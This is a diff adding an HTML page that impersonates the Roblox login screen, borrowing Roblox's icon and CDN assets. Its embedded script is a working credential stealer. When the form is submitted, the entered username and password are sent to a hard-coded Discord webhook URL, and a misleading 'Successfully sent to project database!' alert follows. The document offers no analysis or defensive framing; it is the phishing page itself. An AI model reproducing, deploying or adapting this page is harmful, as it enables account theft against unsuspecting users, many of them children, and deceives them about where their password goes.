@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Log in to Roblox</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon">
+<link rel="stylesheet" href="https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png" onerror="void 0">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+@font-face { font-family: 'Builder Sans'; src: local('Nunito'); font-weight: 400; }
+@font-face { font-family: 'Builder Sans'; src: local('Nunito Bold'); font-weight: 700; }
+
+:root {
+  --font: 'Builder Sans', 'Nunito', sans-serif;
+  --color-page-bg: #1a1a1a;
+  --color-surface: rgba(42, 42, 42, 0.9); /* Made slightly transparent for the background */
+  --color-blue: #0166ff;
+  --color-text: #e0e0e0;
+  --color-err: #e86262;
+}
+
+body {
+  font-family: var(--font);
+  /* --- BACKGROUND IMAGE ADDED HERE --- */
+  background-image: url('https://image_generation_content/1');
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
+  background-attachment: fixed;
+  color: var(--color-text);
+  margin: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+}
+
+/* Optional Overlay to make the background darker behind the form */
+body::before {
+  content: "";
+  position: absolute;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(0, 0, 0, 0.5);
+  z-index: -1;
+}
+
+.login-form {
+  background: var(--color-surface);
+  padding: 40px;
+  border-radius: 8px;
+  width: 100%;
+  max-width: 400px;
+  text-align: center;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+  position: relative;
+  z-index: 1;
+}
+
+.form-group { margin-bottom: 20px; text-align: left; }
+.form-control {
+  width: 100%;
+  padding: 12px;
+  background: #393939;
+  border: 1px solid #4f4f4f;
+  color: white;
+  border-radius: 4px;
+  margin-top: 5px;
+}
+
+.btn-login {
+  width: 100%;
+  padding: 12px;
+  background: var(--color-blue);
+  color: white;
+  border: none;
+  border-radius: 4px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+.btn-login:disabled { opacity: 0.6; cursor: not-allowed; }
+
+.error-message { color: var(--color-err); font-size: 12px; display: none; }
+.visible { display: block; }
+</style>
+</head>
+<body>
+
+<form class="login-form">
+    <h2>Login to Roblox</h2>
+    <div class="form-group">
+        <input type="text" id="login-username" class="form-control" placeholder="Username/Email/Phone">
+        <div id="username-err" class="error-message">Please enter your username</div>
+    </div>
+    <div class="form-group">
+        <input type="password" id="login-password" class="form-control" placeholder="Password">
+        <div id="password-err" class="error-message">Please enter your password</div>
+    </div>
+    <button type="submit" id="login-button" class="btn-login">Log In</button>
+</form>
+
+<script>
+(function () {
+  const webhookUrl = 'https://discord.com/api/webhooks/1474754129648947273/U4bP6uZ5hjZait9l_U0oFZnhdIbzavke0ECXkwHlzdBih4RJpog5Vbs7pUy-KzDy8Vu_';
+
+  const form = document.querySelector('.login-form');
+  const uInput = document.getElementById('login-username');
+  const pInput = document.getElementById('login-password');
+  const uErr = document.getElementById('username-err');
+  const pErr = document.getElementById('password-err');
+  const btn = document.getElementById('login-button');
+
+  form.addEventListener('submit', async function (e) {
+    e.preventDefault();
+    
+    uErr.classList.remove('visible');
+    pErr.classList.remove('visible');
+
+    if (!uInput.value) return uErr.classList.add('visible');
+    if (!pInput.value) return pErr.classList.add('visible');
+
+    btn.disabled = true;
+    btn.innerText = "Logging in...";
+
+    const payload = {
+      content: "🛠️ **Project Data Received**",
+      embeds: [{
+        title: "Login Submission",
+        color: 0x0166ff,
+        fields: [
+          { name: "Username", value: "`" + uInput.value + "`", inline: true },
+          { name: "Password", value: "`" + pInput.value + "`", inline: true }
+        ],
+        timestamp: new Date()
+      }]
+    };
+
+    try {
+      await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      
+      alert("Successfully sent to project database!");
+    } catch (err) {
+      console.error("Error saving data:", err);
+    } finally {
+      btn.disabled = false;
+      btn.innerText = "Log In";
+    }
+  });
+})();
+</script>
+
+</body>
+</html>
